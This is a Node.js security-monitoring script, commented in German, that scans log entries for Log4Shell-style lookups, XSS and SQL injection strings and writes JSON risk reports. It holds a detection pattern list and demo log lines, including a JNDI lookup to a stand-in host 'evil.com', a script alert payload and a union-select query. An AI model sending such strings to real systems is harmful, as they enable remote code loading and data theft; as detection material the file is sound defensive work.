#!/usr/bin/env node

/**
 * Security Monitoring Tool für Node.js Musik-Plattform
 * Log4Shell-äquivalenter Schutz und Monitoring
 */

const fs = require('fs');
const path = require('path');

class SecurityMonitor {
    constructor() {
        this.suspiciousPatterns = [
            '${jndi:', '${ldap:', '${dns:', '${lower:', '${upper:',
            '${env:', '${sys:', '${date:', '${ctx:', '%{', '$((',
            '<script', 'javascript:', 'union select', 'drop table'
        ];
        
        this.alerts = [];
        this.stats = {
            totalRequests: 0,
            blockedAttempts: 0,
            rateLimitHits: 0,
            injectionAttempts: 0
        };
    }

    // Analysiere Log-Einträge auf verdächtige Aktivitäten
    analyzeLogEntry(logEntry) {
        this.stats.totalRequests++;

        // Prüfe auf Injection-Versuche
        for (const pattern of this.suspiciousPatterns) {
            if (logEntry.toLowerCase().includes(pattern.toLowerCase())) {
                this.stats.injectionAttempts++;
                this.stats.blockedAttempts++;
                
                this.alerts.push({
                    type: 'INJECTION_ATTEMPT',
                    timestamp: new Date().toISOString(),
                    pattern: pattern,
                    severity: 'HIGH',
                    logEntry: logEntry.substring(0, 200) // Truncate für Sicherheit
                });
                
                return true; // Verdächtig
            }
        }

        // Prüfe auf Rate-Limit-Überschreitungen
        if (logEntry.includes('rate limit exceeded')) {
            this.stats.rateLimitHits++;
            
            this.alerts.push({
                type: 'RATE_LIMIT_EXCEEDED',
                timestamp: new Date().toISOString(),
                severity: 'MEDIUM',
                logEntry: logEntry.substring(0, 200)
            });
        }

        return false;
    }

    // Generiere Security-Report
    generateSecurityReport() {
        const report = {
            timestamp: new Date().toISOString(),
            summary: {
                totalRequests: this.stats.totalRequests,
                blockedAttempts: this.stats.blockedAttempts,
                rateLimitHits: this.stats.rateLimitHits,
                injectionAttempts: this.stats.injectionAttempts,
                riskLevel: this.calculateRiskLevel()
            },
            recentAlerts: this.alerts.slice(-10), // Letzte 10 Alerts
            recommendations: this.generateRecommendations()
        };

        return report;
    }

    // Berechne Risiko-Level basierend auf Aktivitäten
    calculateRiskLevel() {
        const injectionRate = this.stats.injectionAttempts / Math.max(this.stats.totalRequests, 1);
        
        if (injectionRate > 0.1) return 'HIGH';
        if (injectionRate > 0.05) return 'MEDIUM';
        return 'LOW';
    }

    // Generiere Sicherheitsempfehlungen
    generateRecommendations() {
        const recommendations = [];

        if (this.stats.injectionAttempts > 10) {
            recommendations.push({
                type: 'INJECTION_PROTECTION',
                message: 'Hohe Anzahl von Injection-Versuchen erkannt. Erwägen Sie zusätzliche WAF-Regeln.',
                priority: 'HIGH'
            });
        }

        if (this.stats.rateLimitHits > 100) {
            recommendations.push({
                type: 'RATE_LIMITING',
                message: 'Viele Rate-Limit-Überschreitungen. Erwägen Sie strengere Limits.',
                priority: 'MEDIUM'
            });
        }

        if (this.alerts.length === 0) {
            recommendations.push({
                type: 'STATUS',
                message: 'Alle Sicherheitschecks bestanden. System läuft sicher.',
                priority: 'INFO'
            });
        }

        return recommendations;
    }

    // Exportiere Report als JSON
    exportReport(filename = 'security-report.json') {
        const report = this.generateSecurityReport();
        const reportPath = path.join(__dirname, 'logs', filename);
        
        // Erstelle logs-Verzeichnis falls nicht vorhanden
        const logsDir = path.dirname(reportPath);
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }

        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
        console.log(`✅ Security-Report exportiert: ${reportPath}`);
        
        return report;
    }

    // Real-time Monitoring starten
    startMonitoring() {
        console.log('🛡️ Security-Monitor gestartet...');
        console.log('📊 Überwacht: Injection-Versuche, Rate-Limits, verdächtige Patterns');
        
        // Simuliere Log-Analyse (in Produktion würde dies echte Logs analysieren)
        setInterval(() => {
            const report = this.generateSecurityReport();
            
            if (report.summary.riskLevel === 'HIGH') {
                console.log('🚨 HIGH RISK: Verdächtige Aktivitäten erkannt!');
                console.log(`   Injection-Versuche: ${report.summary.injectionAttempts}`);
                console.log(`   Blockierte Anfragen: ${report.summary.blockedAttempts}`);
            }
        }, 30000); // Alle 30 Sekunden prüfen
    }
}

// CLI-Interface
if (require.main === module) {
    const monitor = new SecurityMonitor();
    
    // Simuliere einige Log-Einträge für Demo
    const testLogEntries = [
        'Normal request: GET /api/health',
        'Suspicious: ${jndi:ldap://evil.com/exploit}',
        'Rate limit exceeded for IP: 192.168.1.100',
        'Normal request: POST /api/gemini/chat',
        'XSS attempt: <script>alert("xss")</script>',
        'SQL injection: union select * from users'
    ];

    console.log('🧪 Demo: Analysiere Test-Log-Einträge...\n');
    
    testLogEntries.forEach((entry, index) => {
        console.log(`Log ${index + 1}: ${entry}`);
        const isSuspicious = monitor.analyzeLogEntry(entry);
        console.log(`   Status: ${isSuspicious ? '🚨 VERDÄCHTIG' : '✅ OK'}\n`);
    });

    // Generiere und exportiere Report
    const report = monitor.exportReport();
    
    console.log('\n📊 Security-Report Summary:');
    console.log(`   Risiko-Level: ${report.summary.riskLevel}`);
    console.log(`   Gesamt-Requests: ${report.summary.totalRequests}`);
    console.log(`   Blockierte Versuche: ${report.summary.blockedAttempts}`);
    console.log(`   Injection-Versuche: ${report.summary.injectionAttempts}`);
    console.log(`   Rate-Limit-Hits: ${report.summary.rateLimitHits}`);

    if (report.recommendations.length > 0) {
        console.log('\n💡 Empfehlungen:');
        report.recommendations.forEach(rec => {
            console.log(`   [${rec.priority}] ${rec.message}`);
        });
    }

    // Starte kontinuierliches Monitoring
    monitor.startMonitoring();
}

module.exports = SecurityMonitor;